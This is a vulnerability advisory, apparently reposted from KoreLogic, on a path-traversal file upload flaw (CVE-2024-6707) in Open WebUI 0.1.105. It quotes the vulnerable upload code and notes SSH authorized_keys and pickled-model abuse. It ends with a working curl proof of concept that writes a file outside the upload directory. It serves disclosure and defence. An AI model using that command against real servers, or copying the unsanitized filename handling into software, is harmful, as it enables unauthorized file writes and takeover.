@@ -1,0 +1,126 @@
+id: 39711
+date: 08/08/2024
+title: Open WebUI 0.1.105 File Upload / Path Traversal Vulnerabilities
+author: Jaggar Henry
+cves: CVE-2024-6707
+
+Title: Open WebUI Arbitrary File Upload + Path Traversal
+Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2024-006.txt
+
+
+1. Vulnerability Details
+
+      Affected Vendor: Open WebUI
+      Affected Product: Open WebUI
+      Affected Version: 0.1.105
+      Platform: Debian 12
+      CWE Classification: CWE-22: Improper Limitation of a Pathname to a
+                          Restricted Directory ('Path Traversal'),
+                          CWE-434: Unrestricted Upload of File with Dangerous
+                          Type
+      CVE ID: CVE-2024-6707
+
+
+2. Vulnerability Description
+
+      Attacker controlled files can be uploaded to arbitrary
+      locations on the web server's filesystem by abusing a
+      path traversal vulnerability.
+
+
+3. Technical Description
+
+    When attaching files to a prompt by clicking the
+    plus sign (+) on the left of the message input box
+    when using the Open WebUI HTTP interface, the file
+    is uploaded to a static upload directory.
+
+    The name of the file is derived from the original
+    HTTP upload request and is not validated or sanitized.
+    This allows for users to upload files with names
+    containing dot-segments in the file path and traverse
+    out of the intended uploads directory. Effectively, users
+    can upload files anywhere on the filesystem the
+    user running the web server has permission.
+
+    This can be visualized by examining the python code
+    for the "/rag/api/v1/doc" API route:
+
+       @app.post("/doc")
+       def store_doc(
+           collection_name: Optional[str] = Form(None),
+           file: UploadFile = File(...),
+           user=Depends(get_current_user),
+       ):
+           # "https://www.gutenberg.org/files/1727/1727-h/1727-h.htm"
+
+           print(file.content_type)
+           try:
+               filename = file.filename
+               file_path = f"{UPLOAD_DIR}/{filename}"
+               contents = file.file.read()
+               with open(file_path, "wb") as f:
+                   f.write(contents)
+                   f.close()
+
+    The "file" variable is a representation of the multipart
+    form data contained within the HTTP POST request. The
+    "filename" variable is derived from the uploaded file name
+    and is not validated before writing the file contents
+    to disk.
+
+     This can be used to upload malicious models. These models
+     are often distributed as pickled python objects and can
+     be leveraged to execute arbitrary python bytecode once
+     deserialized. Alternatively, an attacker can leverage existing
+     services, such as SSH, to upload an attacker controlled
+     "authorized_keys" file to remotely connect to the machine.
+
+
+4. Mitigation and Remediation Recommendation
+
+      This issue was remediated in Open WebUI release v0.1.117 on 2024.04.03.
+
+
+5. Credit
+
+      This vulnerability was discovered by Jaggar Henry and Sean
+      Segreti of KoreLogic, Inc.
+
+
+6. Disclosure Timeline
+
+      2024.03.05 - KoreLogic requests secure communications channel and point
+                   of contact from OpenWebUI.com via email.
+      2024.03.12 - KoreLogic submits vulnerability details and suggested patch
+                   to maintainer via Github Security 'Report a vulnerability'
+                   web form.
+      2024.04.01 - KoreLogic opens Discussion #1385 via GitHub to request an
+                   update from the maintainer.
+      2024.04.01 - Maintainer opens a private fork and merges KoreLogic's patch.
+      2024.04.03 - Maintainer releases v0.1.117.
+      2024.08.06 - KoreLogic public disclosure.
+
+
+7. Proof of Concept
+
+    Execute the following cURL command:
+
+       TARGET_URI='https://redacted.com'; JWT='redacted'; LOCAL_FILE='/tmp/file_to_upload.txt'\
+       curl -H "Authorization: Bearer $JWT" -F "file=$LOCAL_FILE;filename=../../../../../../../../../../tmp/pwned.txt" 
+"$TARGET_URI/rag/api/v1/doc"
+
+    Verify the file "pwned.txt" exists in the /tmp/ directory on
+    the machine hosting the web server:
+
+       ollama@webserver:~$ cat /tmp/pwned.txt
+       korelogic
+       ollama@webserver:~$
+
+
+The contents of this advisory are copyright(c) 2024
+KoreLogic, Inc. and are licensed under a Creative Commons
+Attribution Share-Alike 4.0 (United States) License:
+http://creativecommons.org/licenses/by-sa/4.0/
+
+#  0day.today [2024-08-12]  #
